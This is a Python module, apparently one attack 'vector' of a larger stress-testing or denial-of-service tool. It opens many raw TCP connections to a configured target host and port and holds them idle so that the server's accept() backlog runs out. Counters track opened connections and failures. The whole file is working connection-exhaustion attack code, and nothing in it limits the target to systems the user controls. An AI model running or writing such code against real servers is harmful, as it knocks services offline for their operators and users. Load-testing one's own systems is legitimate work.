"""TCP connection-exhaustion vector: open raw TCP connections and hold them
idle. Against a backlog-limited server this starves accept() capacity.
Optional data payload keeps sockets "established" from the server's view.
"""

from __future__ import annotations

import asyncio

from .base import Vector


class TcpExhaust(Vector):
    name = "tcpexhaust"

    def __init__(self, cfg, stats, worker_id):
        super().__init__(cfg, stats, worker_id)
        self._writers = []

    async def _open_one(self):
        tgt = self.cfg.target

        async def _make():
            return await asyncio.open_connection(tgt.host, tgt.port)

        reader, writer = await self._connect(_make, self.cfg.connect_timeout)
        return reader, writer

    async def background(self):
        target_n = max(1, self.cfg.connections // self.cfg.processes)
        for _ in range(target_n):
            try:
                r, w = await self._open_one()
            except (asyncio.TimeoutError, ConnectionError, OSError):
                self.stats.bump("connfail")
                await asyncio.sleep(0.02)
                continue
            self._writers.append(w)
            self.stats.bump("connections")

    async def run_unit(self, t: float):
        if len(self._writers) >= self.cfg.max_inflight:
            return
        try:
            r, w = await self._open_one()
        except (asyncio.TimeoutError, ConnectionError, OSError):
            self.stats.bump("connfail")
            return
        self._writers.append(w)
        self.stats.bump("connections")
        self.stats.bump("requests")
        self.stats.bump("success")

    async def aclose(self):
        for w in self._writers:
            try:
                w.close()
            except Exception:
                pass
        self._writers.clear()
